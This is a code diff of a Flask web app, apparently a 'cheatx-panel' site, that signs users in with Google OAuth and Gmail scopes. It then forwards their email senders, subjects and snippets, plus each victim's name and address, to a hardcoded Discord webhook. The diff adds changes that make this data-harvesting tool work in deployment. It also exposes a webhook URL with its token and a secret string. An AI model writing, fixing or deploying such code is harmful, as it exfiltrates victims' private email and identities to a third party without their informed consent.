@@ -6,10 +6,11 @@ import requests
 import os
 import pickle
 
-os.environ['OAUTHLIB_INSECURE_TRANSPORT'] = '1'
+# Required to allow HTTP for local, but you're on HTTPS so disable this
+# os.environ['OAUTHLIB_INSECURE_TRANSPORT'] = '1'  # ❌ REMOVE THIS for production
 
 app = Flask(__name__)
-app.secret_key = os.environ.get("-a_1&kqa+%!_hb^=&2pqa_k4mafpjt@ire-z)$1%v!q12@ad20", "your_strong_fallback_secret_key")
+app.secret_key = os.environ.get("FLASK_SECRET_KEY", "your_strong_fallback_secret_key")
 
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1398007512640258088/zBCBlGVdhqmrFkIAvD6pjq05XHRl7NyfewUnf7Q1xkZ0Ja9UGZe-4ZgQjh-QSMat9791"
 SCOPES = [
@@ -34,15 +35,13 @@ def fetch_and_notify(credentials):
     if not messages:
         return False
 
-    # Store IDs of already sent emails in session
     sent_ids = session.get('sent_email_ids', [])
-
     new_sent_ids = []
 
     for msg in messages:
         msg_id = msg['id']
         if msg_id in sent_ids:
-            continue  # Skip already sent emails
+            continue
 
         full_msg = service.users().messages().get(userId='me', id=msg_id, format='metadata', metadataHeaders=['From', 'Subject']).execute()
         headers = full_msg['payload']['headers']
@@ -53,10 +52,8 @@ def fetch_and_notify(credentials):
         send_to_discord(subject, sender, snippet)
         new_sent_ids.append(msg_id)
 
-    # Update session with newly sent IDs
     session['sent_email_ids'] = sent_ids + new_sent_ids
     return True
-
 
 @app.route('/')
 def index():
@@ -90,20 +87,14 @@ def location():
 def logout():
     session.clear()
     return redirect('/')
-    
 
-#Problem Here I think🤔 
 @app.route('/google_login')
 def google_login():
     flow = google_auth_oauthlib.flow.Flow.from_client_secrets_file(
         'client_secret.json',
         scopes=SCOPES
     )
-
-    flow.redirect_uri = url_for('oauth2callback', _external=True)
-
-    print("🚀 REDIRECT URI used by Flask:", flow.redirect_uri)  # 👈 ADD THIS
-
+    flow.redirect_uri = "https://cheatx-panel.onrender.com/oauth2callback"  # ✅ Use fixed URI
     authorization_url, state = flow.authorization_url(
         access_type='offline',
         include_granted_scopes='true'
@@ -114,34 +105,31 @@ def google_login():
 @app.route('/oauth2callback')
 def oauth2callback():
     state_in_session = session.get('state')
-    print(f"🌐 Session State: {state_in_session}")
-    print(f"🌐 Request URL: {request.url}")
+    if not state_in_session:
+        return "Missing session state.", 400
 
     flow = google_auth_oauthlib.flow.Flow.from_client_secrets_file(
         'client_secret.json',
         scopes=SCOPES,
         state=state_in_session
     )
-    flow.redirect_uri = url_for('oauth2callback', _external=True)
+    flow.redirect_uri = "https://cheatx-panel.onrender.com/oauth2callback"  # ✅ Use fixed URI
     flow.fetch_token(authorization_response=request.url)
     credentials = flow.credentials
 
-    # Save credentials in session
     session['credentials'] = pickle.dumps(credentials)
 
-    # Fetch user profile info
-    user_info_service = googleapiclient.discovery.build(
-        'oauth2', 'v2', credentials=credentials)
+    user_info_service = googleapiclient.discovery.build('oauth2', 'v2', credentials=credentials)
     user_info = user_info_service.userinfo().get().execute()
 
     email = user_info.get('email', 'Unknown')
     name = user_info.get('name', 'Unknown')
 
-    # Send login info to Discord
     login_message = f"✅ **New Gmail Login**\n**Name:** {name}\n**Email:** {email}"
     requests.post(DISCORD_WEBHOOK_URL, json={"content": login_message})
 
     return redirect(url_for('dashboard'))
 
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', debug=True)
+# ❌ REMOVE this block so it doesn’t run locally
+# if __name__ == '__main__':
+#     app.run(host='0.0.0.0', debug=True)
